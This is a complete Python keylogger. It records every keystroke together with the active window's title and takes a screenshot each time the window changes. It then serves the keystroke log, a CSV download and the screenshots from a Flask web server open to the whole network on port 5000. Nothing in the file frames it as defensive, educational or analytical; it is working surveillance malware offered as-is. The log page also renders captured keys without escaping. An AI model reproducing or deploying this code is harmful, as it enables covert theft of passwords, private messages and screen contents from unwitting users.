import os
import time
import csv
import threading
import pandas as pd
import pyautogui
import subprocess
from datetime import datetime
from flask import Flask, render_template_string, send_from_directory
from pynput import keyboard

# Globals
log_file = "keylogs.csv"
screenshot_dir = "screenshots"
current_window = ""
log_data = []

# Ensure screenshot folder exists
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

# Function to get active window title
def get_active_window():
    try:
        result = subprocess.run(["xdotool", "getactivewindow", "getwindowname"], capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return "Unknown"

# Function to take screenshot
def take_screenshot():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    window = get_active_window().replace(" ", "_").replace("/", "_")
    filename = f"{timestamp}_{window}.png"
    filepath = os.path.join(screenshot_dir, filename)
    pyautogui.screenshot(filepath)
    return filename

# Function to log data
def write_log(key_str, window):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = [timestamp, window, key_str]
    log_data.append(log_entry)
    
    # Append to CSV
    with open(log_file, mode="a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(log_entry)

# Keylogger callback
def on_press(key):
    global current_window
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    new_window = get_active_window()
    if new_window != current_window:
        current_window = new_window
        take_screenshot()
    
    write_log(key_str, current_window)

# Start keylogger thread
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Flask app
app = Flask(__name__)

@app.route("/")
def index():
    if not os.path.exists(log_file):
        return "No logs yet."
    df = pd.read_csv(log_file, names=["Timestamp", "Window", "Key"])
    html = df.to_html(classes="table table-striped", index=False, escape=False)
    return render_template_string("""
        <html>
        <head>
            <title>Keylogger Logs</title>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
        </head>
        <body class="p-4">
            <h2>🔑 Keylogger Logs</h2>
            <a href="/download" class="btn btn-success mb-3">Download CSV</a>
            <a href="/screenshots" class="btn btn-primary mb-3 ms-2">View Screenshots</a>
            {{ table|safe }}
        </body>
        </html>
    """, table=html)

@app.route("/download")
def download_csv():
    return send_from_directory(".", log_file, as_attachment=True)

@app.route("/screenshots")
def list_screenshots():
    files = os.listdir(screenshot_dir)
    links = ''.join(f'<li><a href="/screenshot/{f}">{f}</a></li>' for f in files)
    return f"<h2>📸 Screenshots</h2><ul>{links}</ul>"

@app.route("/screenshot/<filename>")
def serve_screenshot(filename):
    return send_from_directory(screenshot_dir, filename)

# Run both keylogger and web server
if __name__ == "__main__":
    t = threading.Thread(target=start_keylogger, daemon=True)
    t.start()
    app.run(host="0.0.0.0", port=5000, debug=False)
